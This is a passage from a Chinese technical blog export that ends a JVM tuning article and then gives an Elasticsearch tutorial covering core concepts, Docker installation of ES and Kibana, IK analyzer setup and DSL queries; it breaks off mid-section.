id=\"九-、结语\"><a href=\"#九-、结语\" class=\"headerlink\" title=\"九 、结语\"></a>九 、结语</h2><p>在JVM调优中，关键在于准确识别系统的性能瓶颈和优化方向，选择适合的调优策略和参数。</p>\n<p>实施调优方案后，必须验证效果，并持续监控系统性能，及时调整优化策略和参数以保持系统高性能和稳定性。</p>\n<p>同时，需要及时发现和解决各种潜在的性能问题，如内存泄漏、CPU飙升、频繁的垃圾回收等，以确保系统在高负载和复杂环境下能够保持卓越的性能表现。</p>\n<p>总之，JVM调优是一个持续改进的过程，通过对系统性能的深入分析和优化，确保Java应用程序在各种情况下都能够保持高效稳定的运行状态。</p>\n<p>随着硬件技术的迅速发展，JVM调优也将面临新的挑战和机遇。新一代的处理器、存储技术以及分布式系统架构等将对JVM调优提出更高的要求，需要更智能、更高效的优化方案来适应日益复杂的应用场景和巨大的数据处理需求。</p>\n<p>未来，JVM调优将持续创新和进步，以满足不断变化的业务需求和技术挑战，为Java应用程序提供更稳定、更高效的运行环境，推动Java生态系统的蓬勃发展和壮大。</p>\n<p>与开篇所述保持一致，我们强调在JVM调优中，真正的参数调整是较少的，更多的是通过分析日志和结合系统业务进行代码层面的优化。</p>\n<p>这可能是调优工作中占据更大比重的内容。我们不应迷失方向，只为了调优而调优，只为了调整参数而调整参数。最终，我们需要回归到业务本质，这才是最核心的内容。我们也需要更深入地了解JVM的相关参数，以更好地支撑业务需求的实现。</p>\n<h2 id=\"说在最后：有问题找老架构取经\"><a href=\"#说在最后：有问题找老架构取经\" class=\"headerlink\" title=\"说在最后：有问题找老架构取经\"></a>说在最后：有问题找老架构取经</h2><p><strong>JVM 调优方法论</strong>、JVM调优 相关的面试题，是非常常见的面试题。也是核心面试题。</p>\n<p>以上的内容，如果大家能对答如流，如数家珍，基本上 面试官会被你 震惊到、吸引到。</p>\n"},{"title":"ES从入门到精通","date":"2024-06-16T10:47:07.000Z","_content":"\nElasticSearch 从入门到工业级使用\n=======================\n\n1.1 什么是全文检索\n-----------\n\n将非结构化数据中的一部分信息提取出来，重新组织，使其变得有一定结构，然后对此有一定结构的数据进行搜索，从而达到搜索相对较快的目的。这部分从非结构化数据中提取出的然后重新组织的信息，我们称之索引。\n\n例如：字典。字典的拼音表和部首检字表就相当于字典的索引，对每一个字的解释是非结构化的，如果字典没有音节表和部首检字表，在茫茫辞海中找一个字只能顺序扫描。\n\n然而字的某些信息可以提取出来进行结构化处理，比如读音，就比较结构化，分声母和韵母，分别只有几种可以一一列举，于是将读音拿出来按一定的顺序排列，每一项读音都指向此字的详细解释的页数。\n\n我们搜索时按结构化的拼音搜到读音，然后按其指向的页数，便可找到我们的非结构化数据——也即对字的解释。 这种先建立索引，再对索引进行搜索的过程就叫全文检索(Full-text Search)。\n\n虽然创建索引的过程也是非常耗时的，但是索引一旦创建就可以多次使用，全文检索主要处理的是查询，所以耗时间创建索引是值得的。\n![](./2024/06/16/ES从入门到精通/1.png)\n比如使用全文检索，所搜索“生化机”\n![](./2024/06/16/ES从入门到精通/2.png)\n（有可能是手抖打错了，本来是生化危机），但是期望需要出来右侧的 4条 记录\n\n有 4条 数据将每条数据进行词条拆分。\n\n如“生化危机电影”拆成：生化、危机、电影 关键词（拆分结果与策略算法有关）每个关键词将对应包含此关键词的数据 ID搜索的时候，直接匹配这些关键词，就能拿到包含关键词的数据这个过程就叫做全文检索。\n\n而词条拆分和词条对应的 ID 这个就是倒排索引的的基本原理\n\n**对比数据库的缺陷**\n\nmysql如果没有索引的情况下，共有100万条,按照之前的思路,其实就要扫描100万次，而且每次扫描,都需要匹配那个文本所有的字符，确认是否包含搜索的关键词，而且还不能将搜索词拆解开来进行检索\n![](./2024/06/16/ES从入门到精通/3.png)\n**全文检索使用场景**\n\n*   维基百科，类似百度百科，牙膏，牙膏的维基百科，全文检索，高亮，搜索推荐\n\n*   The Guardian（国外新闻网站），类似搜狐新闻，用户行为日志（点击，浏览，收藏，评论）+社交网络数据（对某某新闻的相关看法），数据分析，给到每篇新闻文章的作者，让他知道他的文章的公众反馈（好，坏，热门，垃圾，鄙视，崇拜）\n\n*   Stack Overflow（国外的程序异常讨论论坛），IT问题，程序的报错，提交上去，有人会跟你讨论和回答，全文检索，搜索相关问题和答案，程序报错了，就会将报错信息粘贴到里面去，搜索有没有对应的答案\n\n*   GitHub（开源代码管理），搜索上千亿行代码（5）电商网站，检索商品\n\n*   日志数据分析，logstash采集日志，ES进行复杂的数据分析（ELK技术，elasticsearch+logstash+kibana）\n\n*   商品价格监控网站，用户设定某商品的价格阈值，当低于该阈值的时候，发送通知消息给用户，比如说订阅牙膏的监控，如果高露洁牙膏的家庭套装低于50块钱，就通知我，我就去买\n\n*   BI系统，商业智能，Business Intelligence。比如说有个大型商场集团，BI，分析一下某某区域最近3年的用户消费金额的趋势以及用户群体的组成构成，产出相关的数张报表，\\*\\*区，最近3年，每年消费金额呈现100%的增长，而且用户群体85%是高级白领，开一个新商场。ES执行数据分析和挖掘，Kibana进行数据可视化\n\n\n1.2 ES简介\n--------\n\nElaticsearch，简称为es， es是一个开源的高扩展的分布式全文检索引擎，它可以近乎实时的存储、检索数据；本身扩展性很好，可以扩展到上百台服务器，处理PB级别的数据。\n\nes也使用Java开发并使用Lucene作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。\n\nElasticsearch是面向文档(document oriented)的，这意味着它可以存储整个对象或文档(document)。然而它不仅仅是存储，还会索引(index)每个文档的内容使之可以被搜索。\n\n在Elasticsearch中，你可以对文档（而非成行成列的数据）进行索引、搜索、排序、过滤。Elasticsearch比传统关系型数据库如下：\n\n```\n\n\nRelational DB -> Databases -> Tables -> Rows -> Columns  \nElasticsearch -> Indices   -> Types  -> Documents -> Fields  \n\n\n\n```\n\nElasticsearch提供多种语言支持，其中Java的客户端为 Java REST Client 。\n\n而它又分成两种：高级和低级的。高级包含更多的功能，如果把高级比作MyBatis的话，那么低级就相当于JDBC，是基于Netty和Server通讯相关。\n\n高级的 Client类似Mybatis是对于Low Level的封装。\n![](./2024/06/16/ES从入门到精通/4.png)\n1.3 ES基本概念\n----------\n\n1.  **索引库**\n\n\nElasticSearch将它的数据存储在一个或多个索引（index）中。\n\n用SQL领域的术语来类比，索引就像数据库，可以向索引写入文档或者从索引中读取文档，并通过ElasticSearch内部使用Lucene将数据写入索引或从索引中检索数据。\n\nElastic Search使用倒排索引（Inverted Index）来做快速的全文搜索，这点与数据库不同，一般数据库 的索引，用B+Tree来实现。\n\n| **Relational DB** | **Databases** | **Tables** | **表结构** | **Rows** | **Columns** |\n| --- | --- | --- | --- | --- | --- |\n|ElasticSearch| Indices| Types| 映射mapping| Documents| Fields 字段|\n\n索引库就是存储索引的保存在磁盘上的一系列的文件。里面存储了建立好的索引信息以及文档对象。一个索引库相当于数据库中的一张表。\n![](./2024/06/16/ES从入门到精通/5.png)\n2.  **document对象**\n\n\n获取原始内容的目的是为了索引，在索引前需要将原始内容创建成文档（Document），文档中包括一个一个的域（Field），域中存储内容。\n\n每个文档都有一个唯一的编号，就是文档id。\n\ndocument对象相当于表中的一条记录。\n\n文档（document）是ElasticSearch中的主要实体。\n\n对所有使用ElasticSearch的案例来说，他们最终都可以归结为对文档的搜索。\n\n文档由字段构成。\n\n![](./2024/06/16/ES从入门到精通/6.png)\n3.  **field对象**\n\n\n如果我们把document看做是数据库中一条记录的话，field相当于是记录中的字段。field是索引库中存储数据的最小单位。field的数据类型大致可以分为数值类型和文本类型，一般需要查询的字段都是文本类型的，field的还有如下属性：\n\n*   是否分词：是否对域的内容进行分词处理。前提是我们要对域的内容进行查询。\n\n*   是否索引：将Field分析后的词或整个Field值进行索引，只有索引方可搜索到。比如：商品名称、商品简介分析后进行索引，订单号、身份证号不用分词但也要索引，这些将来都要作为查询条件。\n\n*   是否存储：将Field值存储在文档中，存储在文档中的Field才可以从Document中获取。比如：商品名称、订单号，凡是将来要从Document中获取的Field都要存储。\n\n\n4.  **term对象**\n\n\n从文档对象中拆分出来的每个单词叫做一个Term，不同的域中拆分出来的相同的单词是不同的term。\n\nterm中包含两部分一部分是文档的域名，另一部分是单词的内容。\n\nterm是创建索引的关键词对象。\n\n8.  **类型（type）**\n\n\n每个文档都有与之对应的类型（type）定义。\n\n这允许用户在一个索引中存储多种文档类型，并为不同文 档提供类型提供不同的映射。 type的版本迭代\n\n*   5.x及以前版本一个index有一个或者多个type\n\n*   6.X版本一个index只有一个index\n\n*   7.X版本移除了type，type相关的所有内容全部变成Deprecated，为了兼容升级和过渡，所有的7.X版本es数据写入后type字段都默认被置为\\_doc\n\n*   8.X版本完全废弃type\n\n\n9.  **映射（mapping）**\n\n\nmapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分析器、是否被索引等等，这些都是映射里面可以设置的，其它就是处理es里面数据的一些使用规则设置也叫做映射，按着最优规则处理数据对性能提高很大，因此才需要建立映射，并且需要思考如何建立映射才能对性能更好。\n\n10.  **分片（shards）**\n\n\n代表索引分片，es可以把一个完整的索引分成多个分片，这样的好处是可以把一个大的索引拆分成多个，分布到不同的节点上。构成分布式搜索。分片的数量只能在索引创建前指定，并且索引创建后不能更改。\n\n5.X默认不能通过配置文件定义分片 ES默认5:1 5个主分片，每个分片，1个副本分片\n\n11.  **副本（replicas）**\n\n\n代表索引副本，es可以设置多个索引的副本，副本的作用：\n\n*   提高系统的容错性，当个某个节点某个分片损坏或丢失时可以从副本中恢复。\n\n*   是提高es的查询效率，es会自动对搜索请求进行负载均衡。\n\n\n12.  **集群（cluster）**\n\n\n代表一个集群，集群中有多个节点（node），其中有一个为主节点，这个主节点是可以通过选举产生的，主从节点是对于集群内部来说的。es的一个概念就是去中心化，字面上理解就是无中心节点，这是对于集群外部来说的，因为从外部来看es集群，在逻辑上是个整体，你与任何一个节点的通信和与整个es集群通信是等价的。\n\n2 安装和DSL的使用\n===========\n\n2.1 安装ES\n--------\n\n使用docker安装单点Elasticsearch，步骤如下：\n\n```\n\n\ndocker network create elastic  \ndocker pull docker.elastic.co/elasticsearch/elasticsearch:7.15.2  \ndocker run -di --name es --net elastic -p 192.168.56.181:9200:9200 -p 192.168.56.181:9300:9300 -e \"discovery.type=single-node\" docker.elastic.co/elasticsearch/elasticsearch:7.15.2  \n\n\n\n```\n\n9200端口(Web管理平台端口)  9300(服务默认端口)\n\n浏览器输入地址访问：`http://192.168.56.181:9200/`\n\n![](./2024/06/16/ES从入门到精通/7.png)\n3.  **系统参数配置**\n\n\nes发现重启启动失败了，这时什么原因呢？\n\n这与我们刚才修改的配置有关，因为elasticsearch在启动的时候会进行一些检查，比如最多打开的文件的个数以及虚拟内存区域数量等等，如果你放开了此配置，意味着需要打开更多的文件以及虚拟内存，所以我们还需要系统调优 修改vi /etc/security/limits.conf ，追加内容 (nofile是单个进程允许打开的最大文件个数 soft nofile 是软限制 hard nofile是硬限制 )\n\n```\n\n\n\\* soft nofile 65536  \n\\* hard nofile 65536  \n\n\n\n```\n\n修改vi /etc/sysctl.conf，追加内容 (限制一个进程可以拥有的VMA(虚拟内存区域)的数量 )\n\n```\n\n\nvm.max\\_map\\_count\\=655360  \n\n\n\n```\n\n执行下面命令 修改内核参数马上生效\n\n```\n\n\nsysctl \\-p  \n\n\n\n```\n\n重新启动虚拟机，再次启动容器，发现已经可以启动并远程访问\n\n```\n\n\nreboot  \n\n\n\n```\n\n2.2 安装Kibana\n------------\n\nKibana是一个针对Elasticsearch的开源分析及可视化平台，用来搜索、查看交互存储在Elasticsearch索引中的数据。使用Kibana，可以通过各种图表进行高级数据分析及展示。\n\nKibana让海量数据更容易理解。它操作简单，基于浏览器的用户界面可以快速创建仪表板（dashboard）实时显示Elasticsearch查询动态。\n\n设置Kibana非常简单。\n\n无需编码或者额外的基础架构，几分钟内就可以完成Kibana安装并启动Elasticsearch索引监测。\n\nQuery DSL是一个Java开源框架用于构建类型安全的SQL查询语句。\n\n采用API代替传统的拼接字符串来构造查询语句。\n\n目前QueryDSL支持的平台包括JPA，JDO，SQL，Java Collections，RDF，Lucene，Hibernate Search。elasticsearch提供了一整套基于JSON的DSL语言来定义查询。\n\n```\n\n\ndocker pull docker.elastic.co/kibana/kibana:7.15.2  \ndocker run -di --name kb --net elastic -p 192.168.56.181:5601:5601 -e \"ELASTICSEARCH\\_HOSTS=http://192.168.56.181:9200\" docker.elastic.co/kibana/kibana:7.15.2  \n\n\n\n```\n\n1.  拉取kibana镜像\n\n\n```\n\n\ndocker pull docker.elastic.co/kibana/kibana:7.15.2  \n\n\n\n```\n\n2.  安装kibana容器\n\n\n```\n\n\ndocker run -di --name kb --net elastic -p 192.168.56.181:5601:5601 -e \"ELASTICSEARCH\\_HOSTS=http://192.168.56.181:9200\" docker.elastic.co/kibana/kibana:7.15.2  \n\n\n\n```\n\n3.  修改配置文件\n\n\n```\n\n\ndocker exec -it kb /bin/bash  \nvi config/kibana.yml  \n\n\n\n```\n\n好像不改也可以，因为上面docker启动有了ES地址\n\n```\n\n\n#修改elasticsarch.hosts: \\[ \"http://elasticsearch:9200\" \\]，如下：  \nelasticsearch.hosts: \\[ \"http://192.168.56.181:9200\" \\]  \n\n\n\n```\n\n2.3通过脚本一键启动ES\n-------------\n\n通过提供的脚本，和配置文件，可以一键启动ES\n\n这个非常的容易，非常的轻量级。 具体请参见视频。\n\n![](./2024/06/16/ES从入门到精通/8.png)\n启动完之后的效果\n\n![](./2024/06/16/ES从入门到精通/9.png)\n接下来，可以访问es\n\nhttp://cdh1:9200\n\n![](./2024/06/16/ES从入门到精通/10.png)\n接下来，可以访问 Kibana\n\n```\n\n\n默认的地址     http://cdh1:5601               \n  \n的一键环境地址     http://cdh1:5601             \n\n\n```\n\n![](./2024/06/16/ES从入门到精通/11.png)\n2.4使用 DSL 操作ES\n--------------\n\n在 Kibana的开发工具界面，可以执行 DSL 去进行ES的查询。\n\n![](./2024/06/16/ES从入门到精通/12.png)\nes开发，常常需要用到DSL语法去定义好 es的查询语句。\n\n就像 myql开发，需要提前定义好 sql语句，并进行sql 的执行和测试一样。\n\n### 2.4.1DSL 定义基本介绍\n\n##### DSL（Domain Specific Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。\n\n在Elasticsearch中，可用DSL语法来定义查询和过滤条件，以及执行聚合操作。\n\nDSL语法 具有JSON格式，因此它非常易于阅读和编写。\n\n### 2.4.2DSL 定义语法说明\n\n###### （1）关键字(Keywords)\n\n*   DSL通常会定义一组关键字，这些关键字具有特殊含义，并在DSL中起到关键作用。关键字通常不能用作标识符或变量名。\n\n*   示例：在一个简单的数学表达式DSL中，可能会定义关键字如\"add\"、\"subtract\"等来表示加法和减法操作。\n\n\n###### （2）标识符(Identifiers)\n\n*   标识符是用来表示变量名、函数名或其他用户定义的名称。它们需要遵循特定的命名规则，如大小写敏感、不包含特殊字符等。\n\n*   示例：在一个配置文件DSL中，可以使用标识符来表示不同的配置项，如\"username\"、\"password\"等。\n\n\n###### （3）表达式(Expressions)\n\n*   表达式是DSL中最基本的构建块，用于计算或产生某个值。表达式可以包括变量、常量、运算符和函数调用。\n\n*   示例：在一个数学表达式DSL中，可以将\"2 + 3\"作为一个表达式，计算结果为5。\n\n\n###### （4）运算符(Operators)\n\n*   运算符用于执行各种操作，例如算术运算、逻辑运算、比较运算等。DSL中的运算符根据所涉及的领域和需求而定。\n\n*   示例：在一个布尔表达式DSL中，可以定义逻辑运算符如\"and\"、\"or\"用于连接多个条件。\n\n\n###### （5）函数调用(Function Calls)\n\n*   DSL可以支持函数调用，允许用户使用预定义或自定义的函数来完成特定的任务。函数调用通常由函数名称和传递给函数的参数组成。\n\n*   示例：在一个日期处理DSL中，可以定义函数\"formatDate(date, format)\"，其中\"date\"是日期值，\"format\"是日期格式字符串。\n\n\n###### （6）控制流(Control Flow)\n\n*   控制流语句用于控制程序的执行流程，例如条件语句(if-else)和循环语句(while、for)等。DSL可以支持特定的控制流语句来满足领域特定需求。\n\n*   示例：在一个工作流程DSL中，可以使用条件语句来判断某个条件是否满足并执行相应的操作。\n\n\n###### （7）注释(Comments)\n\n*   注释用于向DSL代码添加说明性文本，以便开发人员理解和维护代码。注释通常不会被编译或执行，仅用于阅读目的。\n\n*   示例：在DSL中，可以使用双斜杠(//)或特定的注释标记来添加注释，如：“// 这是一个示例注释”。\n\n\n### 2.4.3DSL常见语法\n\n> 文章实在太长， 这里省略了500字+， 省略的内容请参见的免费电子书 PDF版本《ES学习圣经：从0到1, 精通 ElasticSearch 工业级使用 》\n\n3 ES 的分词器\n=========\n\n3.1 倒排索引\n--------\n\n![](./2024/06/16/ES从入门到精通/13.png)\n如上图\n\n*   左边的是正排索引，通过文档的id如查找文档的内容\n\n*   右边的是倒排索引，通过单词统计次数以及文档的位置，\n\n\n如Elasticsearch出现的次数为3，在id=1，id=2，id=3都出现过，且位置分别为1，0，0\n\n3.2 默认分词器\n---------\n\n默认分词器对于英文分词的效果如下\n\n```\n\n\nPOST /\\_analyze  \n{  \n  \"text\": \"You can use Elasticsearch to store, search, and manage data\",  \n  \"analyzer\": \"standard\"  \n}  \n  \n  \n\n\n\n```\n\n结果如下：\n![](./2024/06/16/ES从入门到精通/14.png)\n```\n\n\nPOST /\\_analyze  \n{  \n  \"text\": \"中华人民共和国人民大会堂\",  \n  \"analyzer\": \"standard\"  \n}  \n\n\n\n```\n\n![](./2024/06/16/ES从入门到精通/15.png)\n3.3 中文分词\n--------\n\n中文分词是中文文本处理的一个基础步骤，也是中文人机自然语言交互的基础模块。\n\n不同于英文的是，中文句子中没有词的界限，因此在进行中文自然语言处理时，通常需要先进行分词，\n\n分词效果将直接影响词性、句法树等模块的效果。\n\n当然分词只是一个工具，场景不同，要求也不同。\n\n部分分词工具如下：\n\n*   中科院计算所NLPIR http://ictclas.nlpir.org/nlpir/\n\n*   ansj分词器 https://github.com/NLPchina/ansj\\_seg\n\n*   哈工大的LTP https://github.com/HIT-SCIR/ltp\n\n*   清华大学THULAC https://github.com/thunlp/THULAC\n\n*   斯坦福分词器 https://nlp.stanford.edu/software/segmenter.shtml\n\n*   Hanlp分词器 https://github.com/hankcs/HanLP\n\n*   结巴分词 https://github.com/yanyiwu/cppjieba\n\n*   KCWS分词器(字嵌入+Bi-LSTM+CRF) https://github.com/koth/kcws\n\n*   ZPar https://github.com/frcchang/zpar/releases\n\n*   IKAnalyzer https://github.com/wks/ik-analyzer\n\n\n3.4 IK分词器\n---------\n\nIK分词器下载地址https://github.com/medcl/elasticsearch-analysis-ik/releases 将ik分词器上传到服务器上，然后解压，并改名字为ik\n\n```\n\n\nmkdir ~/ik  \nmv elasticsearch-analysis-ik-7.15.2.zip ~/ik  \nunzip elasticsearch-analysis-ik-7.15.2.zip  \n\n\n\n```\n\n将ik目录拷贝到docker容器的plugins目录下\n\n```\n\n\ndocker cp ./ik es:/usr/share/elasticsearch/plugins  \n\n\n\n```\n\n> 特别说明，的一键启动版本，已经默认戴上了IK分词器\n\nIKAnalyzer是一个开源的，基于java语言开发的轻量级的中文分词工具包，IK分词器分为两种模式\n\n1.  **ik\\_max\\_word：会将文本做最细粒度的拆分**\n\n\n比如会将“中华人民共和国人民大会堂”拆分为“中华人民共和国、中华人民、中华、华人、人民共和国、人民、共和国、大会堂、大会、会堂等词语。\n\n```\n\n\nPOST /\\_analyze  \n{  \n\"text\":\"中华人民共和国人民大会堂\",  \n\"analyzer\":\"ik\\_max\\_word\"  \n}  \n\n\n\n```\n\n![](./2024/06/16/ES从入门到精通/16.png)\n2.  **ik\\_smart：会做最粗粒度的拆分**\n\n\n比如会将“中华人民共和国人民大会堂”拆分为中华人民共和国、人民大会堂。\n\n```\n\n\nPOST /\\_analyze  \n{  \n  \"text\": \"中华人民共和国人民大会堂\",  \n  \"analyzer\": \"ik\\_smart\"  \n}  \n\n\n\n```\n\n![](./2024/06/16/ES从入门到精通/17.png)\n3.5 自定义扩展字典\n-----------\n\nIK分词器的两种模式的最佳实践是：索引时用ik\\_max\\_word，搜索时用ik\\_smart，索引时最大化的将文章内容分词，搜索时更精确的搜索到想要的结果。\n\n举个例子：用户输入“华为手机”搜索，此时应该搜索出“华为手机”的商品，而不是“华为”和“手机”这两个词，这样会搜索出华为其它的商品，\n\n此时使用ik\\_smart和ik\\_max\\_word都会将华为手机拆分为华为和手机两个词，那些只包括“华为”这个词的信息也被搜索出来了，我的目标是搜索只包含华为手机这个词的信息，这没有满足我的目标。\n\nik\\_smart默认情况下分词“华为手机”，依然会分成两个词“华为”和“手机”，这时需要使用自定义扩展字典\n\n1.  **进入es**\n\n\n```\n\n\ndocker exec -it es /bin/bash  \n\n\n\n```\n\n2.  **增加自定义字典文件**\n\n\n如果容器编辑乱码，可以在宿主机编辑，然后拷贝到容器中\n\n```\n\n\n#进入ik配置目录  \ncd plugins/ik/config/  \nvi new\\_word.dic  \n\n\n\n```\n\n内容如下：\n\n```\n\n\n老铁  \n王者荣耀  \n洪荒之力  \n共有产权房  \n一带一路  \njava日知录  \n华为手机  \n\n\n\n```\n\n3.  **修改配置文件**\n\n\n```\n\n\nvi IKAnalyzer.cfg.xml  \n\n\n\n```\n\n内容如下：\n\n```\n\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n<!DOCTYPE properties SYSTEM \"http://java.sun.com/dtd/properties.dtd\"\\>  \n<properties>  \n        <comment>IK Analyzer 扩展配置</comment>  \n        <!--用户可以在这里配置自己的扩展字典 -->  \n        <entry key=\"ext\\_dict\"\\>new\\_word.dic</entry>  \n         <!--用户可以在这里配置自己的扩展停止词字典-->  \n        <entry key=\"ext\\_stopwords\"\\></entry>  \n        <!--用户可以在这里配置远程扩展字典 -->  \n        <!-- <entry key=\"remote\\_ext\\_dict\"\\>words\\_location</entry> -->  \n        <!--用户可以在这里配置远程扩展停止词字典-->  \n        <!-- <entry key=\"remote\\_ext\\_stopwords\"\\>words\\_location</entry> -->  \n</properties>  \n\n\n\n```\n\n4.  **拷贝到宿主机**\n\n\n```\n\n\ndocker cp es:/usr/share/elasticsearch/plugins/elasticsearch-analysis-ik/config ~/ik  \n\n\n\n```\n\n5.  **重启**\n\n\n```\n\n\ndocker restart es  \n\n\n\n```\n\n4 高级的DSL 查询\n===========\n\n前面介绍了基础的DSL查询，接下来，介绍一下高级的DSL 查询\n\nES提供基于DSL(Domain Specific Language)的索引查询模式，\n\nDSL查询基于JSON定义查询\n\nWikipedia对于DSL的定义\"**为了解决某一类任务而专门设计的计算机语言\"**\n\n大师Martin Fowler对于DSL定义“**DSL 通过在表达能力上做的妥协换取在某一领域内的高效**”\n\n我们在使用ES的时候，避免不了使用DSL语句去查询，就像使用关系型数据库的时候要学会SQL语法一样。\n\n如果我们学习好了DSL语法的使用，那么在日后使用和使用Java Client调用时候也会变得非常简单。\n\n![](./2024/06/16/ES从入门到精通/18.png)\n> Elasticsearch provides a full Query DSL (Domain Specific Language) based on JSON to define queries. Think of the Query DSL as an AST (Abstract Syntax Tree) of queries\n\n4.1 管理索引\n--------\n\n查看所有的索引\n\n```\n\n\nGET \\_cat/indices?v  \n\n\n\n```\n\n![](./2024/06/16/ES从入门到精通/19.png)\n1.  **删除某个索引**\n\n\n```\n\n\nDELETE /skuinfo  \n\n\n\n```\n\n2.  **新增索引**\n\n\n```\n\n\nPUT /user  \n\n\n\n```\n\n3.  **创建映射**\n\n\n```\n\n\nPUT /user/\\_mapping  \n{  \n  \"properties\": {  \n    \"name\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    },  \n    \"city\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    },  \n    \"age\":{  \n      \"type\": \"long\"  \n    },  \n    \"description\":{  \n      \"type\": \"text\",  \n      \"analyzer\": \"ik\\_smart\",  \n      \"search\\_analyzer\": \"ik\\_smart\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n4.  **新增文档数据**\n\n\n```\n\n\nPUT /user/\\_doc/1  \n{  \n  \"name\":\"李四\",  \n  \"age\":22,  \n  \"city\":\"深圳\",  \n  \"description\":\"李四来自湖北武汉！\"  \n}  \n  \n\n\n\n```\n\n再增加几条记录：\n\n```\n\n\n#新增文档数据 id=2  \nPUT /user/\\_doc/2  \n{  \n  \"name\":\"王五\",  \n  \"age\":35,  \n  \"city\":\"深圳\",  \n  \"description\":\"王五家住在深圳！\"  \n}  \n  \n#新增文档数据 id=3  \nPUT /user/\\_doc/3  \n{  \n  \"name\":\"张三\",  \n  \"age\":19,  \n  \"city\":\"深圳\",  \n  \"description\":\"在深圳打工，来自湖北武汉\"  \n}  \n  \n#新增文档数据 id=4  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"age\":66,  \n  \"city\":\"武汉\",  \n  \"description\":\"在武汉读书，家在武汉！\"  \n}  \n  \n#新增文档数据 id=5  \nPUT /user/\\_doc/5  \n{  \n  \"name\":\"赵子龙\",  \n  \"age\":77,  \n  \"city\":\"广州\",  \n  \"description\":\"赵子龙来自深圳宝安，但是在广州工作！\",  \n  \"address\":\"广东省茂名市\"  \n}  \n  \n#新增文档数据 id=6  \nPUT /user/\\_doc/6  \n{  \n  \"name\":\"赵毅\",  \n  \"age\":55,  \n  \"city\":\"广州\",  \n  \"description\":\"赵毅来自广州白云区，从事电子商务8年！\"  \n}  \n  \n#新增文档数据 id=7  \nPUT /user/\\_doc/7  \n{  \n  \"name\":\"赵哈哈\",  \n  \"age\":57,  \n  \"city\":\"武汉\",  \n  \"description\":\"武汉赵哈哈，在深圳打工已有半年了，月薪7500！\"  \n}  \n\n\n\n```\n\n5.  **修改数据**\n\n\n**（1）操作1**\n\n更新数据可以使用之前的增加操作,这种操作会将整个数据替换掉，代码如下：\n\n```\n\n\n#更新数据,id=4  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"description\":\"在武汉读书，家在武汉！在深圳工作！\"  \n}  \n\n\n\n```\n\n使用GET命令查看：\n\n```\n\n\n#根据ID查询  \nGET /user/\\_doc/4  \n\n\n\n```\n\n**（2）操作2**\n\n我们先使用下面命令恢复数据：\n\n```\n\n\n#恢复文档数据 id=4  \nPUT /user/\\_doc/4  \n{  \n  \"name\":\"张三丰\",  \n  \"age\":66,  \n  \"city\":\"武汉\",  \n  \"description\":\"在武汉读书，家在武汉！\"  \n}  \n\n\n\n```\n\n使用POST更新某个列的数据\n\n```\n\n\n#使用POST更新某个域的数据  \nPOST /user/\\_doc/4  \n{  \n  \"doc\":{  \n    \"name\":\"张三丰\",  \n    \"description\":\"在武汉读书，家在武汉！在深圳工作！\"  \n  }  \n}  \n\n\n\n```\n\n6.  **删除Document**\n\n\n```\n\n\n#删除数据  \nDELETE user/userinfo/7  \n\n\n\n```\n\n4.2 数据查询\n--------\n\n1.  **查询所有数据**\n\n\n```\n\n\n#查询所有  \nGET /user/\\_search  \n\n\n\n```\n\n2.  **根据ID查询**\n\n\n```\n\n\n#根据ID查询  \nGET /user/\\_doc/2  \n\n\n\n```\n\n3.  **Sort排序**\n\n\n```\n\n\n#搜索排序  \nGET /user/\\_search  \n{  \n  \"query\":{  \n    \"match\\_all\": {}  \n  },  \n  \"sort\":{  \n    \"age\":{  \n      \"order\":\"desc\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n4.  **分页**\n\n\n```\n\n\n#分页实现  \nGET /user/\\_search  \n{  \n  \"query\":{  \n    \"match\\_all\": {}  \n  },  \n  \"sort\":{  \n    \"age\":{  \n      \"order\":\"desc\"  \n    }  \n  },  \n  \"from\": 0,  \n  \"size\": 2  \n}  \n\n\n\n```\n\n*   from:从下N的记录开始查询\n\n*   size:每页显示条数\n\n\n4.3 查询模式\n--------\n\n1.  **term查询**\n\n\nterm主要用于分词精确匹配，如字符串、数值、日期等（不适合情况：1.列中除英文字符外有其它值 2.字符串值中有冒号或中文 3.系统自带属性如\\_version）\n\n```\n\n\n#查询-term  \nGET \\_search  \n{  \n  \"query\":{  \n    \"term\":{  \n      \"city\":\"武汉\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n2.  **terms 查询**\n\n\nterms 跟 term 有点类似，但 terms 允许指定多个匹配条件。 如果某个字段指定了多个值，那么文档需要一起去做匹配 。\n\n```\n\n\n#查询-terms 允许多个Term  \nGET \\_search  \n{  \n  \"query\":{  \n    \"terms\":{  \n      \"city\":  \n        \\[  \n          \"武汉\",  \n          \"广州\"  \n        \\]  \n    }  \n  }  \n}  \n\n\n\n```\n\n3.  **match查询**\n\n\n```\n\n\nGET \\_search  \n{  \n  \"query\": {  \n    \"match\": {  \n      \"city\": \"广州武汉\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n4.  **query\\_string查询**\n\n\n```\n\n\nGET \\_search  \n{  \n  \"query\": {  \n    \"query\\_string\": {  \n      \"default\\_field\": \"city\",  \n      \"query\": \"广州武汉\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n5.  **range 查询**\n\n\nrange过滤允许我们按照指定范围查找一批数据。例如我们查询年龄范围\n\n```\n\n\n#-range 范围过滤  \n#gt表示> gte表示=>  \n#lt表示< lte表示<=  \nGET \\_search  \n{  \n  \"query\":{  \n    \"range\": {  \n      \"age\": {  \n        \"gte\": 30,  \n        \"lte\": 57  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n6.  **exists**\n\n\nexists 过滤可以用于查找拥有某个域的数据\n\n```\n\n\n#搜索 exists：是指包含某个域的数据检索  \nGET \\_search  \n{  \n  \"query\": {  \n    \"exists\":{  \n      \"field\":\"address\"  \n    }  \n  }  \n}  \n\n\n\n```\n\n7.  **bool 查询**\n\n\nbool 